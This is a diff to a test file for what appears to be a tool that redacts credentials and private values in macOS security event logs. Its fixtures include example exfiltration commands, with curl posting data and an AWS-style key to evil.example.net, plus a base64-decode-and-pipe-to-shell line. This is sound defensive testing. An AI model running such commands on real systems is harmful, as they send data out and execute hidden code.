@@ -2380,9 +2380,12 @@ describe.skipIf(!fs.existsSync(JQ))('secrets and data', () => {
       expect(r.status, r.stderr).toBe(0);
       return r;
     });
-  /** No key row's real value holds a marker, a redaction or a placeholder. */
+  /** No key row's real value holds a marker or a placeholder; only a request body may hold a redaction. */
   const cleanKey = (key: string): void => {
-    for (const k of parseKey(key)) expect(k.real, k.placeholder).not.toMatch(/[\u0001\u0002]|<redacted>|(?:name|host|data|user)\d+|internal\.invalid|example\.invalid/);
+    for (const k of parseKey(key)) {
+      expect(k.real, k.placeholder).not.toMatch(/[\u0001\u0002]|(?:name|host|data|user)\d+|internal\.invalid|example\.invalid/);
+      if (k.kind !== 'data') expect(k.real, k.placeholder).not.toContain('<redacted>');
+    }
   };
   const ruleIds = (out: string): Set<string> =>
     new Set([...findingSignature(buildModel(lines(out))).values()].flat().map(s => s.split(':')[0]!));
@@ -2516,6 +2519,8 @@ describe.skipIf(!fs.existsSync(JQ))('secrets and data', () => {
       run(1503, '/bin/sh', ['sh', '-c', "curl -d 'q=Board+minutes' https://evil.example.net"], '/', 4),
       run(1504, '/usr/bin/env', ['env', `PAYLOAD=${B64}`, '/usr/bin/true'], '/', 5),
       run(1505, '/usr/bin/base64', ['base64', '-d'], '/', 6),
+      // A credential shape in a body is redacted before the body is keyed.
+      run(1506, '/usr/bin/curl', ['curl', '--data-raw', `q=Minutes&k=${AKIA}`, 'https://evil.example.net'], '/', 7),
     ].join('\n') + '\n';
     for (const r of both(input)) {
       const args = events(r.out).map(e => e.event.exec.args as string[]);
@@ -2528,9 +2533,12 @@ describe.skipIf(!fs.existsSync(JQ))('secrets and data', () => {
       expect(args[2]![2]).toBe(`echo ${d.get(B64)} | base64 -d | sh`);
       expect(args[3]![2]).toBe(`curl -d '${d.get('q=Board+minutes')}' https://evil.example.net`);
       expect(args[4]).toEqual(['env', `PAYLOAD=${d.get(B64)}`, '/usr/bin/true']);
+      expect(args[6]).toEqual(['curl', '--data-raw', d.get('q=Minutes&k=<redacted>'), 'https://evil.example.net']);
+      expect(r.key).not.toContain(AKIA);
+      expect(r.summary['redacted']).toBe('1');
       // The key holds the real values as JSON strings.
       expect(r.key).toContain(`\t${JSON.stringify('q=Board+minutes')}\n`);
-      expect(r.out).not.toMatch(/Board|Jane|Q3 numbers|Y3VybC/);
+      expect(r.out).not.toMatch(/Board|Jane|Q3 numbers|Y3VybC|Minutes/);
       cleanKey(r.key);
       sameFindings(input, r.out);
     }
@@ -2560,6 +2568,31 @@ describe.skipIf(!fs.existsSync(JQ))('secrets and data', () => {
       expect(ev[5]!.event.exec.args).toEqual(['launchctl', 'kickstart', `gui/501/${id}`]);
       expect(ev[6]!.event.exec.args).toEqual(['open', '-b', id, '--args', '--disable-background-timer-throttling']);
       expect(ev[7]!.event.exec.target.signing_id).toBe(id);
+      sameFindings(input, r.out);
+    }
+  });
+
+  test('a credential shape in a path is redacted where it stands, and the path keeps its shape', () => {
+    const input = [
+      esCreate(zsh, { path: `/tmp/${AKIA}.txt` }, 1),
+      esCreate(zsh, { path: `/Users/jdoe/Documents/${AKIA}/notes.txt` }, 2),
+      esCreate(zsh, { dir: '/Users/jdoe/Documents', filename: `${GHP}.pem` }, 3),
+      run(1650, '/bin/cat', ['cat', `${AKIA}/notes.txt`, `/tmp/${AKIA}.txt`], docs, 4, [...JDOE_ENV.filter(e => !e.startsWith('PWD')), `PWD=/tmp/${AKIA}.txt`]),
+      run(1651, '/bin/sh', ['sh', '-c', `cat ${AKIA}/notes.txt /tmp/${AKIA}.txt`], docs, 5),
+    ].join('\n') + '\n';
+    for (const r of both(input)) {
+      const ev = events(r.out);
+      const R = '<redacted>';
+      const notes = keyed(r.key, 'name').get('notes.txt');
+      expect(ev[0]!.event.create.destination.existing_file.path).toBe(`/tmp/${R}.txt`);
+      expect(ev[1]!.event.create.destination.existing_file.path).toBe(`/Users/user1/Documents/${R}/${notes}`);
+      expect(ev[2]!.event.create.destination.new_path.filename).toBe(`${R}.pem`);
+      expect(ev[3]!.event.exec.args).toEqual(['cat', `${R}/${notes}`, `/tmp/${R}.txt`]);
+      expect(ev[3]!.event.exec.env).toContain(`PWD=/tmp/${R}.txt`);
+      expect(ev[4]!.event.exec.args[2]).toBe(`cat ${R}/${notes} /tmp/${R}.txt`);
+      expect(r.out).not.toMatch(/AKIA|ghp_/);
+      expect(r.key).not.toMatch(/AKIA|ghp_/);
+      cleanKey(r.key);
       sameFindings(input, r.out);
     }
   });
